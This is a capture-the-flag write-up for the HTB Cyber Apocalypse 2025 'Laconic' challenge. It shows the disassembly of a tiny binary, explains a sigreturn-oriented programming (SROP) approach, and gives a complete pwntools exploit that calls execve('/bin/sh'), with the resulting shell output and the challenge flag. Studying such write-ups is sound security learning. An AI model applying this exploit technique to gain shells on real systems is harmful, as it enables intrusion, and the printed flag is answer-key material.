# 2025 HTB Cyber Apocalypse - Laconic

The binary given was very simple with the following assembly in `entry`:
```
                             //
                             // .shellcode 
                             // SHT_PROGBITS  [0x43000 - 0x43019]
                             // ram:00043000-ram:00043019
                             //
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined processEntry entry(void)
             undefined         <UNASSIGNED>   <RETURN>
                             _start                                          XREF[4]:     Entry Point(*), 00042018(*), 
                             __start                                                      00042088(*), 
                             entry                                                        _elfSectionHeaders::00000050(*)  
        00043000 48 c7 c7        MOV        RDI,0x0
                 00 00 00 00
        00043007 48 89 e6        MOV        RSI,RSP
        0004300a 48 83 ee 08     SUB        RSI,0x8
        0004300e 48 c7 c2        MOV        RDX,0x106
                 06 01 00 00
        00043015 0f 05           SYSCALL
        00043017 c3              RET
        00043018 58              ??         58h    X
        00043019 c3              ??         C3h
```

The entrypoint performed a `read` call to subsequent memory. Given that `syscall` is present here, this immediatelly implied SROP. The exploit is simple: use `pop rax` gadget to load SIGRETURN syscall that will load our sigreturn frame and execute `execve`. String /bin/sh was already inside the binary under `0x43238`.

```
from pwn import *

context.os = 'linux'
context.arch = 'amd64'

RWX_ADDR = 0x7fffffffe24a
JMP_ADDR = 0x7fffffffe260
JMP = p64(JMP_ADDR)
RET = 0x0000000000043017
SYSCALL_ADDR = 0x0000000000043015
SYSCALL = p64(SYSCALL_ADDR)
POP_RAX_RET = p64(0x0000000000043018)
POP_RSP_POP_RBP = p64(0x7ffff7ffd839)
STACK_ADDR_BEG = 0x7ffffffde000
STACK_ADDR_END = 0x7ffffffff000
BIN_SH_ADDR = 0x43238
SIGRETURN = p64(15)

r = process("./laconic")
#r = gdb.debug("./laconic", '''
#b _start
#set follow-fork-mode child
#b *0x43000
#''')

payload  = b"A"*8
payload += POP_RAX_RET
payload += SIGRETURN

frame = SigreturnFrame()
frame.rax = 59                # execve
frame.rdi = BIN_SH_ADDR
frame.rsi = 0
frame.rdx = 0
frame.rip = SYSCALL_ADDR
payload += SYSCALL
payload += bytes(frame)

r.sendline(payload)
r.interactive()
```

Local execution:
```
$ python3 xpl.py 
[+] Starting local process './laconic': pid 10976
[*] Switching to interactive mode
$ id
uid=1000(vm) gid=1000(vm) groups=1000(vm),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
$ 
[*] Interrupted
[*] Stopped process './laconic' (pid 10976)
```

```
HTB{s1l3nt_r0p_7366e49195536bb2aae0021c6749c4af}
```
